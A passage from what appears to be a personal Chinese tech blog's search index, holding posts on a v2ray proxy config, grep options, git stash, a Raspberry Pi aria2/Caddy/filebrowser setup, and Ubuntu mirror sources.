id=\"v2ray\"><a href=\"#v2ray\" class=\"headerlink\" title=\"v2ray\"></a>v2ray</h1><h2 id=\"布局\"><a href=\"#布局\" class=\"headerlink\" title=\"布局\"></a>布局</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ tree v2ray -L 2</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">.</span><br><span class=\"line\">├── bin</span><br><span class=\"line\">│   ├── v2ctl</span><br><span class=\"line\">│   ├── v2ray</span><br><span class=\"line\">├── config</span><br><span class=\"line\">│   ├── v2ray.service</span><br><span class=\"line\">│   └── config.json</span><br><span class=\"line\">└── log</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"说明-1\"><a href=\"#说明-1\" class=\"headerlink\" title=\"说明\"></a>说明</h2><p>v2ray采用WebSocket + TLS的组合，并未使用CDN（Cloudflare的CDN感觉有一些水土不服，国内的没找到免费的）。</p>\n<h2 id=\"v2ray-4-22-1\"><a href=\"#v2ray-4-22-1\" class=\"headerlink\" title=\"v2ray 4.22.1\"></a>v2ray 4.22.1</h2><h3 id=\"配置文件-1\"><a href=\"#配置文件-1\" class=\"headerlink\" title=\"配置文件\"></a>配置文件</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ vim ~/program/v2ray/config/config.json</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    &quot;log&quot;: &#123;</span><br><span class=\"line\">        &quot;loglevel&quot;: &quot;error&quot;</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &quot;api&quot;: &#123;</span><br><span class=\"line\">        &quot;tag&quot;: &quot;api&quot;,</span><br><span class=\"line\">        &quot;services&quot;: [</span><br><span class=\"line\">            &quot;HandlerService&quot;,</span><br><span class=\"line\">            &quot;LoggerService&quot;,</span><br><span class=\"line\">            &quot;StatsService&quot;</span><br><span class=\"line\">        ]</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &quot;stats&quot;: &#123;&#125;,</span><br><span class=\"line\">    &quot;inbounds&quot;: [</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;tag&quot;: &quot;proxy&quot;,</span><br><span class=\"line\">            &quot;port&quot;: your_port,</span><br><span class=\"line\">            &quot;protocol&quot;: &quot;vmess&quot;,</span><br><span class=\"line\">            &quot;settings&quot;: &#123;</span><br><span class=\"line\">                &quot;clients&quot;: [</span><br><span class=\"line\">                    &#123;</span><br><span class=\"line\">                        &quot;id&quot;: &quot;your_uuid&quot;,</span><br><span class=\"line\">                        &quot;level&quot;: 1,</span><br><span class=\"line\">                        &quot;alterId&quot;: 10</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                ]</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            &quot;streamSettings&quot;: &#123;</span><br><span class=\"line\">                &quot;network&quot;: &quot;ws&quot;,</span><br><span class=\"line\">                &quot;wsSettings&quot;: &#123;</span><br><span class=\"line\">                    &quot;path&quot;: &quot;/game&quot;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    ],</span><br><span class=\"line\">    &quot;outbounds&quot;: [</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;protocol&quot;: &quot;freedom&quot;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    ],</span><br><span class=\"line\">    &quot;routing&quot;: &#123;</span><br><span class=\"line\">        &quot;rules&quot;: [</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                &quot;type&quot;: &quot;field&quot;,</span><br><span class=\"line\">                &quot;inboundTag&quot;: [</span><br><span class=\"line\">                    &quot;api&quot;</span><br><span class=\"line\">                ],</span><br><span class=\"line\">                &quot;outboundTag&quot;: &quot;api&quot;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        ],</span><br><span class=\"line\">        &quot;strategy&quot;: &quot;rules&quot;</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &quot;policy&quot;: &#123;</span><br><span class=\"line\">        &quot;levels&quot;: &#123;</span><br><span class=\"line\">            &quot;0&quot;: &#123;</span><br><span class=\"line\">                &quot;statsUserUplink&quot;: true,</span><br><span class=\"line\">                &quot;statsUserDownlink&quot;: true</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        &quot;system&quot;: &#123;</span><br><span class=\"line\">            &quot;statsInboundUplink&quot;: true,</span><br><span class=\"line\">            &quot;statsInboundDownlink&quot;: true</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>说明：</p>\n<ol>\n<li><p>可以在写完json文件后使用<code>v2ray --test XXX.json</code>命令检查配置文件是否存在错误。</p>\n</li>\n<li><p>配置文件参考了</p>\n<blockquote>\n<p>博客 <a href=\"https://www.huiyingwu.com/438/\" target=\"_blank\" rel=\"noopener\">利用 Caddy 轻松实现反向代理/镜像（支持自签SSL证书）</a></p>\n</blockquote>\n</li>\n</ol>\n<h3 id=\"systemd进程守护配置-1\"><a href=\"#systemd进程守护配置-1\" class=\"headerlink\" title=\"systemd进程守护配置\"></a>systemd进程守护配置</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ sudo vim /etc/systemd/system/v2ray.service</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[Unit]</span><br><span class=\"line\">Description=V2Ray Service</span><br><span class=\"line\">After=network.target</span><br><span class=\"line\">Wants=network.target</span><br><span class=\"line\"></span><br><span class=\"line\">[Service]</span><br><span class=\"line\"># This service runs as root. You may consider to run it as another use for security concerns.</span><br><span class=\"line\"># By uncommenting the following two lines, this service will run as user v2ray/v2ray.</span><br><span class=\"line\"># More discussion at https://github.com/v2ray/v2ray-core/issues/1011</span><br><span class=\"line\">User=ubuntu</span><br><span class=\"line\">Group=ubuntu</span><br><span class=\"line\">Type=simple</span><br><span class=\"line\">PIDFile=/var/run/v2ray.pid</span><br><span class=\"line\">ExecStart=/home/ubuntu/program/v2ray/bin/v2ray -config /home/ubuntu/program/v2ray/config/config.json</span><br><span class=\"line\">Restart=on-failure</span><br><span class=\"line\"></span><br><span class=\"line\"># Don&apos;t restart in the case of configuration error</span><br><span class=\"line\">RestartPreventExitStatus=23</span><br><span class=\"line\"></span><br><span class=\"line\">[Install]</span><br><span class=\"line\">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"自用bash脚本\"><a href=\"#自用bash脚本\" class=\"headerlink\" title=\"自用bash脚本\"></a>自用bash脚本</h1><p><del>目前还没写完-_-||，等自己忙完这段时间且交上了作业再继续写吧，暂时被锁住了…貌似锁的死死的…</del></p>\n<p>疫情在家效率太低了…</p>\n<h1 id=\"吐槽\"><a href=\"#吐槽\" class=\"headerlink\" title=\"吐槽\"></a>吐槽</h1><p>ssh连接服务器延迟有点高，特别特别是晚上，要等待个2s左右，有时候直接断了，有点小烦…</p>\n<p><em>同宿舍室友说速度比以前快了一些，不知道是不是心理作用…</em></p>\n<p>目前家里是移动网 俗称墙内墙 网络确实有点差劲…</p>\n<h1 id=\"更新历史\"><a href=\"#更新历史\" class=\"headerlink\" title=\"更新历史\"></a>更新历史</h1><p>20191113_1603：初始版本</p>\n<p>20200328_2210：更新caddy2和v2ray部分配置，删除caddy1配置部分。脚本还没写，抽空填坑…</p>\n","categories":["技术"],"tags":["v2ray","caddy","bash"]},{"title":"学习grep","url":"https://littleghost2016.github.io/2019/11/05/学习grep/","content":"<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ grep [-acinv] [--color=auto] <span class=\"string\">'string'</span> filename</span><br></pre></td></tr></table></figure>\n\n<table>\n<thead>\n<tr>\n<th align=\"center\">参数</th>\n<th align=\"center\">注释</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">-a</td>\n<td align=\"center\">将二进制文件以字符串形式搜索</td>\n</tr>\n<tr>\n<td align=\"center\">-c</td>\n<td align=\"center\">计算搜索到目标字符串的次数</td>\n</tr>\n<tr>\n<td align=\"center\">-i</td>\n<td align=\"center\">无视大小写</td>\n</tr>\n<tr>\n<td align=\"center\">-n</td>\n<td align=\"center\">输出行号</td>\n</tr>\n<tr>\n<td align=\"center\">-v</td>\n<td align=\"center\">搜索不带目标字符串的结果</td>\n</tr>\n<tr>\n<td align=\"center\">–color=auto</td>\n<td align=\"center\">搜索到的关键字添加颜色</td>\n</tr>\n</tbody></table>\n","categories":["技术"],"tags":["linux"]},{"title":"git-stash学习","url":"https://littleghost2016.github.io/2019/11/04/git-stash学习/","content":"<h1 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h1><p>昨天继续部署<a href=\"https://github.com/hexojs/hexo\" target=\"_blank\" rel=\"noopener\">hexo</a>的时候发现自己使用的主题<a href=\"https://github.com/forsigner/fexo\" target=\"_blank\" rel=\"noopener\">fexo</a>在Github上有新的commit，于是想对主题进行升级。</p>\n<h1 id=\"更新仓库文件\"><a href=\"#更新仓库文件\" class=\"headerlink\" title=\"更新仓库文件\"></a>更新仓库文件</h1><p>查看fexo文件夹</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ tree -L 1 .</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">.</span><br><span class=\"line\">├── _config.yml</span><br><span class=\"line\">├── gulpfile.js</span><br><span class=\"line\">├── languages</span><br><span class=\"line\">├── layout</span><br><span class=\"line\">├── LICENSE</span><br><span class=\"line\">├── package.json</span><br><span class=\"line\">├── README.md</span><br><span class=\"line\">├── scripts</span><br><span class=\"line\">├── source</span><br><span class=\"line\">└── yarn.lock</span><br></pre></td></tr></table></figure>\n\n<p>直接使用<code>git pull</code>命令发现<code>_config.yml</code>因被修改过而引起冲突，不能直接将仓库进行<code>pull</code>更新，上网搜索“hexo更新主题”，发现了<code>git stash</code>命令。</p>\n<ol>\n<li><p>使用<code>git stash</code>将修改入栈，即执行命令后<code>_config.yml</code>变成了该版本对应文件的最初始状态（因为我在修改<code>_config.yml</code>之后未进行追踪和提交，所以<code>git stash</code>后变成最初始状态）。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ git stash</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>此时执行<code>git status</code>发现没有任何更改。执行<code>git pull</code>更新仓库。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ git pull</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>执行<code>git stash pop</code>将已经入栈的被修改文件出栈到当前文件夹，即完成了保留<code>_config.yml</code>文件的修改，并更新了其他文件的效果。<em>此时栈为空。</em></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ git stash pop</span><br></pre></td></tr></table></figure>\n\n</li>\n</ol>\n<h1 id=\"关于git-stash\"><a href=\"#关于git-stash\" class=\"headerlink\" title=\"关于git stash\"></a>关于git stash</h1><p> 能够将所有未提交的修改（工作区和暂存区）保存至堆栈中，用于后续恢复当前工作目录。 </p>\n<h2 id=\"git-stash-save-“test1”\"><a href=\"#git-stash-save-“test1”\" class=\"headerlink\" title=\"git stash save “test1”\"></a>git stash save “test1”</h2><p>作用同<code>git stash</code>，<code>save</code>会指定一个名称，<code>drop</code>命令可以根据名称删除对应内容。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">tash@&#123;0&#125;: On master: test1</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"git-stash-list\"><a href=\"#git-stash-list\" class=\"headerlink\" title=\"git stash list\"></a>git stash list</h2><p>查看当前stash中的内容。</p>\n<h2 id=\"git-stash-pop\"><a href=\"#git-stash-pop\" class=\"headerlink\" title=\"git stash pop\"></a>git stash pop</h2><p>当前stash中的最后进入的内容出栈，并应用到当前分支对应的工作目录上。<br> <em>注：该命令将堆栈中最近保存的内容删除（栈是先进后出）。</em> </p>\n<h2 id=\"git-stash-apply\"><a href=\"#git-stash-apply\" class=\"headerlink\" title=\"git stash apply\"></a>git stash apply</h2><p>恢复stash中的修改，但与<code>pop</code>不同的是，<code>apply</code>从栈中删除内容。</p>\n<h2 id=\"git-stash-drop-“test1”\"><a href=\"#git-stash-drop-“test1”\" class=\"headerlink\" title=\"git stash drop “test1”\"></a>git stash drop “test1”</h2><p>stash栈中删除名为”test1”的内容。</p>\n<h2 id=\"git-stash-clear\"><a href=\"#git-stash-clear\" class=\"headerlink\" title=\"git stash clear\"></a>git stash clear</h2><p>清除stash栈中的所有内容。</p>\n<h2 id=\"git-stash-show\"><a href=\"#git-stash-show\" class=\"headerlink\" title=\"git stash show\"></a>git stash show</h2><p>显示stash栈中的所有内容。</p>\n<h1 id=\"插一句：解决git中文乱码\"><a href=\"#插一句：解决git中文乱码\" class=\"headerlink\" title=\"插一句：解决git中文乱码\"></a>插一句：解决git中文乱码</h1><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ git config --global core.quotepath <span class=\"literal\">false</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"再插一句\"><a href=\"#再插一句\" class=\"headerlink\" title=\"再插一句\"></a>再插一句</h1><p><code>github-production-release-asset-2e65be.s3.amazonaws.com</code>国内是访问不了的，<code>wget</code>和<code>curl</code>都不能下载到内容，可绑定ip试试。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">52.216.20.147 github-production-release-asset-2e65be.s3.amazonaws.com</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p><a href=\"https://github.com/oldj/SwitchHosts/issues/312\" target=\"_blank\" rel=\"noopener\">brew安装失败 #312</a></p>\n</blockquote>\n","categories":["技术"],"tags":["git","hexo"]},{"title":"树莓派搭建aria2+caddy+filebrowser","url":"https://littleghost2016.github.io/2019/11/02/树莓派搭建aria2+caddy+filebrowser/","content":"<p>树莓派为3B+，24小时供电，<em>就是有点吵</em>。</p>\n<h1 id=\"dnsmasq部分\"><a href=\"#dnsmasq部分\" class=\"headerlink\" title=\"dnsmasq部分\"></a>dnsmasq部分</h1><p>路由器为K2P，刷了Openwrt系统，自带<code>dnsmasq</code>，编辑配置文件</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ vim /etc/dnsmasq.conf</span><br></pre></td></tr></table></figure>\n\n<p>添加以下内容，三四两行自用于内网RDP，与本篇文章的内容无关</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">address=/download.com/192.168.2.198</span><br><span class=\"line\">address=/filebrowser.com/192.168.2.198</span><br><span class=\"line\">address=/mylab6.com/2001::XXXX</span><br><span class=\"line\">address=/mylab.com/10.173.XX.XX</span><br></pre></td></tr></table></figure>\n\n<p>重新启动<code>dnsmasq</code>服务</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ /etc/init.d/dnsmasq restart</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"caddy部分\"><a href=\"#caddy部分\" class=\"headerlink\" title=\"caddy部分\"></a>caddy部分</h1><blockquote>\n<p>   Caddy is praised by researchers and industry experts for its <strong>security defaults</strong> and <strong>unparalleled usability</strong>. ——by <a href=\"https://caddyserver.com/\" target=\"_blank\" rel=\"noopener\">caddyserver</a></p>\n</blockquote>\n<p><code>caddy</code>配置文件简洁，可简单地实现<code>HTTPS</code>功能。本次因想尝试新程序而未使用<code>Nginx</code>。</p>\n<ol>\n<li><p>从官网下载<code>caddy</code>二进制文件</p>\n</li>\n<li><p>使用<code>systemd</code>作进程守护</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ sudo vim /etc/systemd/system/caddy.service</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[Unit]</span><br><span class=\"line\">Description=Caddy Server</span><br><span class=\"line\">After=syslog.target</span><br><span class=\"line\">After=network.target</span><br><span class=\"line\"></span><br><span class=\"line\">[Service]</span><br><span class=\"line\">User=root</span><br><span class=\"line\">Group=root</span><br><span class=\"line\">LimitNOFILE=64000</span><br><span class=\"line\">ExecStart=/home/ubuntu/caddy/caddy -log stdout -agree=true -conf=/home/ubuntu/caddy/config/Caddyfile -root=/home/ubuntu/caddy/www</span><br><span class=\"line\">Restart=always</span><br><span class=\"line\"></span><br><span class=\"line\">[Install]</span><br><span class=\"line\">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>\n\n<p><em>搭建过程中使用ubuntu作为User和Group会报错，尚未解决。</em></p>\n</li>\n<li><p>编辑配置文件<code>Caddyfile</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://download.com:80 &#123;</span><br><span class=\"line\">        root /home/ubuntu/caddy/www/download.com</span><br><span class=\"line\">        gzip</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">http://filebrowser.com:80 &#123;</span><br><span class=\"line\">        proxy / 127.0.0.1:7001</span><br><span class=\"line\">        gzip</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>download.com</code>使用AriaNG，<code>filebrowser</code>则反代端口，因服务目前只架设在内网，均只是用HTTP服务。caddy配置文件确实简洁。</p>\n</li>\n</ol>\n<h1 id=\"aria2部分\"><a href=\"#aria2部分\" class=\"headerlink\" title=\"aria2部分\"></a>aria2部分</h1><h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ sudo apt install aria2</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ tree .</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">.</span><br><span class=\"line\">├── config</span><br><span class=\"line\">│   ├── aria2.conf</span><br><span class=\"line\">│   └── aria2.session</span><br><span class=\"line\">└── downloads</span><br><span class=\"line\">    ├── a</span><br><span class=\"line\">    │   └── 1</span><br><span class=\"line\">    ├── b</span><br><span class=\"line\">    │   ├── 2</span><br><span class=\"line\">    │   └── 3</span><br><span class=\"line\">    ├── c</span><br><span class=\"line\">    │   └── 4</span><br><span class=\"line\">    ├── d</span><br><span class=\"line\">    │   └── 5</span><br><span class=\"line\">    └── e</span><br><span class=\"line\"></span><br><span class=\"line\">7 directories, 7 files</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"使用systemd作进程守护\"><a href=\"#使用systemd作进程守护\" class=\"headerlink\" title=\"使用systemd作进程守护\"></a>使用<code>systemd</code>作进程守护</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ sudo vim /etc/systemd/system/aria2.service</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[Unit]</span><br><span class=\"line\">Description=aria2c -- file download manager</span><br><span class=\"line\">After=network.target</span><br><span class=\"line\"></span><br><span class=\"line\">[Service]</span><br><span class=\"line\">Type=forking</span><br><span class=\"line\">User=ubuntu</span><br><span class=\"line\">Group=ubuntu</span><br><span class=\"line\">#WorkingDirectory=%h</span><br><span class=\"line\">#Environment=VAR=/var/%i</span><br><span class=\"line\">ExecStart=/usr/bin/aria2c -D --conf-path=/home/ubuntu/aria2/config/aria2.conf</span><br><span class=\"line\"></span><br><span class=\"line\">[Install]</span><br><span class=\"line\">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"修改配置文件\"><a href=\"#修改配置文件\" class=\"headerlink\" title=\"修改配置文件\"></a>修改配置文件</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ vim /home/ubuntu/aria2/config/aria2.conf</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#RPC</span></span><br><span class=\"line\"><span class=\"built_in\">enable</span>-rpc=<span class=\"literal\">true</span></span><br><span class=\"line\">rpc-allow-origin-all=<span class=\"literal\">true</span></span><br><span class=\"line\">rpc-listen-all=<span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\">#rpc-listen-port=6800</span></span><br><span class=\"line\"><span class=\"comment\">#require &amp;gt;1.15.2</span></span><br><span class=\"line\"><span class=\"comment\">#rpc-user=ftp</span></span><br><span class=\"line\"><span class=\"comment\">#rpc-passwd=ftp123</span></span><br><span class=\"line\">rpc-secret=XXX</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#RATE</span></span><br><span class=\"line\">max-concurrent-downloads=5</span><br><span class=\"line\"><span class=\"built_in\">continue</span>=<span class=\"literal\">true</span></span><br><span class=\"line\">max-connection-per-server=5</span><br><span class=\"line\">min-split-size=10M</span><br><span class=\"line\">split=10</span><br><span class=\"line\">max-overall-download-limit=0</span><br><span class=\"line\">max-download-limit=0</span><br><span class=\"line\">max-overall-upload-limit=0</span><br><span class=\"line\">max-upload-limit=0</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#B</span></span><br><span class=\"line\"><span class=\"comment\">#PROGRESS</span></span><br><span class=\"line\">input-file=/home/ubuntu/aria2/config/aria2.session</span><br><span class=\"line\">save-session=/home/ubuntu/aria2/config/aria2.session</span><br><span class=\"line\"><span class=\"comment\">#require &amp;gt;1.16.1</span></span><br><span class=\"line\">save-session-interval=120</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#DISK</span></span><br><span class=\"line\">dir=/home/ubuntu/aria2/downloads</span><br><span class=\"line\">file-allocation=prealloc</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#BT</span></span><br><span class=\"line\">bt-enable-lpd=<span class=\"literal\">true</span></span><br><span class=\"line\">bt-max-peers=80</span><br><span class=\"line\">bt-require-crypto=<span class=\"literal\">true</span></span><br><span class=\"line\">follow-torrent=<span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\">#listen-port=6881-6999</span></span><br><span class=\"line\"><span class=\"built_in\">enable</span>-dht=<span class=\"literal\">false</span></span><br><span class=\"line\">bt-enable-lpd=<span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"built_in\">enable</span>-peer-exchange=<span class=\"literal\">false</span></span><br><span class=\"line\">peer-agent=uTorrent/2210(25130)</span><br><span class=\"line\">user-agent=uTorrent/2210(25130)</span><br><span class=\"line\">peer-id-prefix=-UT2210-</span><br><span class=\"line\">seed-ratio=0</span><br><span class=\"line\">force-save=<span class=\"literal\">true</span></span><br><span class=\"line\">bt-hash-check-seed=<span class=\"literal\">true</span></span><br><span class=\"line\">bt-seed-unverified=<span class=\"literal\">true</span></span><br><span class=\"line\">bt-save-metadata=<span class=\"literal\">true</span></span><br><span class=\"line\"></span><br><span class=\"line\">listen-port=50000-65000</span><br></pre></td></tr></table></figure>\n\n<p>HTTP可以，校内PT站可以下载，但公网上的种子和磁力链接都是<code>0/0</code>，尚未解决。</p>\n<h1 id=\"filebrowser部分\"><a href=\"#filebrowser部分\" class=\"headerlink\" title=\"filebrowser部分\"></a>filebrowser部分</h1><ol>\n<li><p>从<code>Github</code>下载二进制文件</p>\n</li>\n<li><p>使用<code>systemd</code>作进程守护</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[Unit]</span><br><span class=\"line\">Description=File Browser</span><br><span class=\"line\">After=network.target</span><br><span class=\"line\"></span><br><span class=\"line\">[Service]</span><br><span class=\"line\">User=ubuntu</span><br><span class=\"line\">Group=ubuntu</span><br><span class=\"line\">ExecStart=/home/ubuntu/filebrowser/filebrowser -d /home/ubuntu/filebrowser/filebrowser.db</span><br><span class=\"line\"></span><br><span class=\"line\">[Install]</span><br><span class=\"line\">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ tree .</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">.</span><br><span class=\"line\">├── caddy</span><br><span class=\"line\">├── caddy_v1.0.3_linux_arm64.tar.gz</span><br><span class=\"line\">├── config</span><br><span class=\"line\">│   ├── Caddyfile</span><br><span class=\"line\">│   └── Caddyfile.bak</span><br><span class=\"line\">├── init</span><br><span class=\"line\">│   ├── README.md</span><br><span class=\"line\">│   ├── freebsd</span><br><span class=\"line\">│   │   ├── README.md</span><br><span class=\"line\">│   │   └── caddy</span><br><span class=\"line\">│   ├── linux-systemd</span><br><span class=\"line\">│   │   ├── README.md</span><br><span class=\"line\">│   │   └── caddy.service</span><br><span class=\"line\">│   ├── linux-sysvinit</span><br><span class=\"line\">│   │   ├── README.md</span><br><span class=\"line\">│   │   └── caddy</span><br><span class=\"line\">│   ├── linux-upstart</span><br><span class=\"line\">│   │   ├── README.md</span><br><span class=\"line\">│   │   ├── caddy.conf</span><br><span class=\"line\">│   │   ├── caddy.conf.centos-6</span><br><span class=\"line\">│   │   └── caddy.conf.ubuntu-12.04</span><br><span class=\"line\">│   └── mac-launchd</span><br><span class=\"line\">│       ├── README.md</span><br><span class=\"line\">│       └── com.caddyserver.web.plist</span><br><span class=\"line\">├── ssl</span><br><span class=\"line\">└── www</span><br><span class=\"line\">    └── download.com</span><br><span class=\"line\">        ├── AriaNg-1.1.4.zip</span><br><span class=\"line\">        ├── LICENSE</span><br><span class=\"line\">        ├── css</span><br><span class=\"line\">        │   ├── aria-ng-2a46099f8c.min.css</span><br><span class=\"line\">        │   ├── bootstrap-3.4.1.min.css</span><br><span class=\"line\">        │   └── plugins-9b678dd4f5.min.css</span><br><span class=\"line\">        ├── favicon.ico</span><br><span class=\"line\">        ├── favicon.png</span><br><span class=\"line\">        ├── fonts</span><br><span class=\"line\">        │   ├── fontawesome-webfont.eot</span><br><span class=\"line\">        │   ├── fontawesome-webfont.svg</span><br><span class=\"line\">        │   ├── fontawesome-webfont.ttf</span><br><span class=\"line\">        │   ├── fontawesome-webfont.woff</span><br><span class=\"line\">        │   └── fontawesome-webfont.woff2</span><br><span class=\"line\">        ├── index.html</span><br><span class=\"line\">        ├── index.manifest</span><br><span class=\"line\">        ├── js</span><br><span class=\"line\">        │   ├── angular-packages-1.6.10.min.js</span><br><span class=\"line\">        │   ├── aria-ng-994a2d3441.min.js</span><br><span class=\"line\">        │   ├── bootstrap-3.4.1.min.js</span><br><span class=\"line\">        │   ├── echarts-common-3.8.5.min.js</span><br><span class=\"line\">        │   ├── jquery-3.3.1.min.js</span><br><span class=\"line\">        │   ├── moment-with-locales-2.24.0.min.js</span><br><span class=\"line\">        │   └── plugins-01928ba731.min.js</span><br><span class=\"line\">        ├── langs</span><br><span class=\"line\">        │   ├── zh_Hans.txt</span><br><span class=\"line\">        │   └── zh_Hant.txt</span><br><span class=\"line\">        ├── robots.txt</span><br><span class=\"line\">        ├── tileicon.png</span><br><span class=\"line\">        └── touchicon.png</span><br><span class=\"line\"></span><br><span class=\"line\">14 directories, 43 files</span><br></pre></td></tr></table></figure>\n\n</li>\n</ol>\n<p><em>对于<code>filebrowser</code>当使用<code>Firefox</code>浏览器时，请关闭“允许页面选择自己的字体代替您的上述选择”，否则会出现网页字体混乱的场景。</em></p>\n<p><img src=\"%E6%9B%BF%E6%8D%A2%E5%AD%97%E4%BD%93.png\" alt=\"替换字体\"></p>\n","categories":["树莓派"],"tags":["树莓派","aria2","caddy","filebrowser"]},{"title":"树莓派使用清华源","url":"https://littleghost2016.github.io/2019/11/02/树莓派使用清华源/","content":"<blockquote>\n<p> Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-1014-raspi2 aarch64)</p>\n</blockquote>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ sudo vim /etc/apt/sources.list.d/tsinghua.source.list</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 默认注释了源码镜像以提高 apt update 速度如有需要可自行取消注释</span><br><span class=\"line\">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ eoan main restricted universe multiverse</span><br><span class=\"line\"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ eoan main restricted universe multiverse</span><br><span class=\"line\">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ eoan-updates main restricted universe multiverse</span><br><span class=\"line\"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ eoan-updates main restricted universe multiverse</span><br><span class=\"line\">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ eoan-backports main restricted universe multiverse</span><br><span class=\"line\"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ eoan-backports main restricted universe multiverse</span><br><span class=\"line\">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ eoan-security main restricted universe multiverse</span><br><span class=\"line\"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ eoan-security main restricted universe multiverse</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ uname -a</span><br><span class=\"line\">Linux ubuntu 